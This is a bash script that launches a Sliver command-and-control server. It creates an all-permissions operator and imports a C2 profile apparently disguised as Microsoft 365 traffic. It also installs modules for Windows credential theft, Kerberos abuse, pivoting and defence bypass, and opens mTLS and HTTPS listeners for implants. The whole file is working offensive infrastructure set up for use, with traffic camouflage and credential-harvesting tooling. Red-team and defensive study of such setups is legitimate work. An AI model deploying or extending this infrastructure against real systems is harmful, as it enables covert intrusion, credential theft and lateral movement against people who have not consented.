#!/bin/bash
# Start Sliver server with auto-listener setup.
# Kills orphans, starts daemon, imports profile (first run), starts mTLS, drops into client.
#
# Usage:
#   ./start.sh                              # mTLS on 8888
#   ./start.sh --domain cdn.yourdomain.com  # mTLS on 8888 + HTTPS on 443
#   ./start.sh --mtls-port 9999             # custom mTLS port
set -e
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
export PATH="/usr/local/go/bin:$HOME/go/bin:$PATH"

MTLS_PORT=8888
HTTPS_PORT=443
DOMAIN=""
while [[ $# -gt 0 ]]; do
    case $1 in
        --domain|-d)     DOMAIN="$2"; shift 2 ;;
        --mtls-port)     MTLS_PORT="$2"; shift 2 ;;
        --https-port)    HTTPS_PORT="$2"; shift 2 ;;
        -h|--help)
            echo "Usage: $0 [--domain DOMAIN] [--mtls-port PORT] [--https-port PORT]"
            exit 0 ;;
        *) echo "Unknown: $1"; exit 1 ;;
    esac
done

# ─── Kill orphan sliver-server processes ───
if pgrep -f "sliver-server" >/dev/null 2>&1; then
    echo "[*] Killing existing sliver-server..."
    pkill -f "sliver-server" 2>/dev/null || true
    sleep 2
fi

# ─── Free listener ports ───
for PORT in $MTLS_PORT $HTTPS_PORT; do
    PIDS=$(lsof -ti :"$PORT" 2>/dev/null || true)
    if [ -n "$PIDS" ]; then
        echo "[*] Killing process on port $PORT (PID $PIDS)..."
        echo "$PIDS" | xargs kill -9 2>/dev/null || true
        sleep 1
    fi
done

# ─── Start server daemon ───
echo "[*] Starting sliver-server daemon..."
"$SCRIPT_DIR/sliver-server" daemon &
SERVER_PID=$!
disown $SERVER_PID

# ─── Wait for server daemon to be ready ───
echo "[*] Waiting for server daemon..."
sleep 5

# ─── Create operator config if needed ───
CFG_DIR="$HOME/.sliver-client/configs"
mkdir -p "$CFG_DIR"
if [ -z "$(ls -A "$CFG_DIR" 2>/dev/null)" ]; then
    echo "[*] Creating operator config..."
    "$SCRIPT_DIR/sliver-server" operator --name local --lhost localhost --permissions all --save "$CFG_DIR/local.cfg"
    if [ -z "$(ls -A "$CFG_DIR" 2>/dev/null)" ]; then
        echo "[-] Operator config creation failed. Check sliver-server logs."
        exit 1
    fi
    echo "[+] Operator config created"
fi

# ─── Verify client can connect ───
echo "[*] Verifying client connection..."
READY=0
for i in $(seq 1 15); do
    if "$SCRIPT_DIR/sliver-client" version &>/dev/null; then
        READY=1; break
    fi
    sleep 2
done
if [ "$READY" = "0" ]; then
    echo "[-] Client cannot connect to server. Check: $SCRIPT_DIR/sliver-server daemon"
    echo "    Config dir: $CFG_DIR"
    ls -la "$CFG_DIR" 2>/dev/null
    exit 1
fi
echo "[+] Server ready (PID $SERVER_PID)"

# ─── Import C2 profile (first run only) ───
MARKER="$HOME/.sliver/.profile_imported"
PROFILE="$SCRIPT_DIR/opsec-profiles/microsoft365-c2.json"
if [ ! -f "$MARKER" ] && [ -f "$PROFILE" ]; then
    echo "[*] Importing microsoft365 C2 profile..."
    "$SCRIPT_DIR/sliver-client" << IMPORT
c2profiles import -n microsoft365 -f $PROFILE
IMPORT
    mkdir -p "$HOME/.sliver" 2>/dev/null
    touch "$MARKER"
    echo "[+] Profile imported (persists across restarts)"
fi

# ─── Install armory extensions (first run only) ───
ARMORY_MARKER="$HOME/.sliver/.armory_installed"
if [ ! -f "$ARMORY_MARKER" ]; then
    echo "[*] Installing armory extensions (first run — takes a few minutes)..."
    "$SCRIPT_DIR/sliver-client" << ARMORY
armory install windows-credentials
armory install kerberos
armory install situational-awareness
armory install windows-pivot
armory install windows-bypass
armory install .net-pivot
armory install .net-recon
armory install .net-execute
ARMORY
    touch "$ARMORY_MARKER"
    echo "[+] Armory extensions installed (persists per-client)"
fi

# ─── Start listeners ───
echo "[*] Starting mTLS listener on 0.0.0.0:$MTLS_PORT..."
LISTENER_CMDS="mtls --lhost 0.0.0.0 --lport $MTLS_PORT"

if [ -n "$DOMAIN" ]; then
    echo "[*] Starting HTTPS listener on 0.0.0.0:$HTTPS_PORT ($DOMAIN)..."
    LISTENER_CMDS="$LISTENER_CMDS
https --lhost 0.0.0.0 --lport $HTTPS_PORT -d $DOMAIN"
fi

"$SCRIPT_DIR/sliver-client" << LISTENERS
$LISTENER_CMDS
LISTENERS

echo ""
echo "════════════════════════════════════════════════"
echo "  Sliver ready"
echo "  mTLS listener: 0.0.0.0:$MTLS_PORT"
[ -n "$DOMAIN" ] && echo "  HTTPS listener: 0.0.0.0:$HTTPS_PORT ($DOMAIN)"
echo "  Server PID: $SERVER_PID"
echo "════════════════════════════════════════════════"
echo ""
echo "[*] Dropping into interactive console..."
exec "$SCRIPT_DIR/sliver-client"
